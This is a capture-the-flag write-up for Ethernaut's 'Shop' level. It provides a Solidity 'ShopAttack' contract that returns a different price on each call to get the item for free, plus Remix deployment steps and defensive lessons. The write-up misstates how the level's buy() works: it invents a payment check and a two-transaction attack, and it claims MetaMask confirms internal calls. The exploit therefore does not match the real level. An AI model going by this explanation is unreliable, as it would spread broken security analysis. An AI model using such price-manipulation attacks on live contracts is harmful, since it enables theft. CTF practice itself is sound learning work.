# Level 21: Shop

## Challenge Overview

This level shows the danger of letting an external contract decide your price.  
In `Shop.buy()`, the shop first calls `Buyer(msg.sender).price()`.  
By returning a high price on the first call and zero on the second,  
a malicious buyer can pay the initial amount and then force the shop’s internal price to zero — allowing purchase for free.



## Solution

### 1. Correct Vulnerability Summary

- `Shop.buy()` does:

  1. `uint offered = Buyer(msg.sender).price();`  
  2. If `offered < price`, then `price = offered` and `sold = true`  
  3. `require(msg.value >= price);`

- By returning exactly `100` (the starting price) on the first `price()` call, you satisfy `require(msg.value >= 100)` without lowering the shop’s price (still 100).
- On the second call, returning `0` forces `price = 0` (since 0 < 100), and then `require(msg.value >= 0)` passes even with a 0 wei payment.



### 2. The “Malicious Buyer” Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";    // Shop interface has buy() and price() in this context
import "./Buyer.sol";   // Buyer interface: function price() external view returns (uint256)

contract ShopAttack is Buyer {
    Shop public shop;
    bool public firstCall = true;

    constructor(address _shopAddress) public {
        shop = Shop(_shopAddress);
    }

    // Called by Shop.buy() to query our price:
    // - First time: return 100 (equal to shop’s price; no update)
    // - Second time: return 0 (forces shop.price = 0, sold = true)
    function price() external override view returns (uint256) {
        if (firstCall) {
            return 100;
        }
        return 0;
    }

    // Kick off the exploit in two steps:
    function attack() external payable {
        // 1) First buy: send exactly 100 wei
        shop.buy{ value: 100 }();

        // Flip so next price() returns 0
        firstCall = false;

        // 2) Second buy: send 0 wei
        shop.buy{ value: 0 }();
    }
}
```



### Summary of Steps

1. We implement `Buyer.price()`.

2. On the first `price()` call we return `100` to satisfy `require(msg.value >= 100)`.

3. On the second, returning `0` forces `price = 0`, so paying `0` wei succeeds.



## 3. Steps to Deploy & Execute the Exploit

### 1. Compile

Compile `Shop.sol`, `Buyer.sol`, and `ShopAttack.sol` under Solidity `^0.6.0`.



### 2. Deploy the Shop First

- In Remix → **Deploy & Run Transactions** → **Injected Web3** (MetaMask).
- Select `Shop` and click **Deploy**.
- Copy its address (`shopAddr`).



### 3. Deploy the Attack Contract with the Shop’s Address

- Select `ShopAttack`, paste `shopAddr` into the constructor box, and click **Deploy**.
- Confirm in MetaMask.



### 4. Run the Exploit

- Under **Deployed Contracts → ShopAttack**, click the `attack()` button  
  (no additional ETH needed — the first call sends 100 wei internally).
- Confirm each internal purchase in MetaMask.



### 5. Verify

- Check `shop.sold()` in the console; it should now be `true`.
- Also `shop.price()` should be `0`.



### 6. Submit

- Submit the level in Ethernaut.



## Lessons Learned

- Don’t trust calls to unknown contracts for critical values like price.
- If you let a single transaction both update a price and check payment, a malicious caller can manipulate that update mid-transaction.
- Instead of calling an untrusted contract inside `buy()`, fetch fixed or pre-verified prices off-chain or enforce a maximum discount.
- Avoid patterns where a contract first queries external code, then immediately acts on that result in the same function, separating reads from writes ensures better safety.
